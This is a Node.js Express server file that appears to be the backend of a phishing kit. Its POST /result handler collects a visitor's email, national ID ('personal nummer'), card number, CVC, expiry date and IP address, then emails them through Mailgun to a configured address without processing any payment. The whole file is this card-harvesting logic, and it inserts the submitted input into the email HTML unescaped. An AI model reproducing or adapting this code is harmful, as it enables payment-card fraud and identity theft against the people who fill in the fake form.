// Server
'use-strict'

// NPM Installed Modules
const path = require('path');
const bodyParser = require('body-parser');
const rangi = require('rangi');
const cors = require('cors');
const express = require('express');
const logger = require('morgan');

// Import mailgun API Information
const config = require('./config.js');

// initialize mailgun
const mailgun = require('mailgun-js')({
    apiKey: config.API_KEY,
    domain: config.DOMAIN
});

const port = config.PORT;

const app = express();

// Express middlewares
app.use(cors());
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));

// Frontend
app.use(express.static(path.join(__dirname, 'public')));

// Start server
app.listen(port, () => {
    console.log(rangi.cyan(`Server Listening On: ${port}`))
});

// Listen for data
app.post('/result', function (req, res, next) {
    mailgun.messages().send({
        from: config.FROM_MAIL,
        to: config.TO_MAIL,
        subject: config.SUBJECT,
        html: `<b>E-Mail: </b>${req.body.email}<br><br><b>Personal Nummer: </b>${req.body.personal_nummer}<br><br><b>Card Number: </b>${req.body.card_number}<br><br><b>Card CVC: </b>${req.body.card_cvc}<br><br><b>Card Expiry: </b>${req.body.card_expiry}<br><br><b>I.P Address: </b>${req.body.ip}`
    }, (error, body) => {
        //
    })
});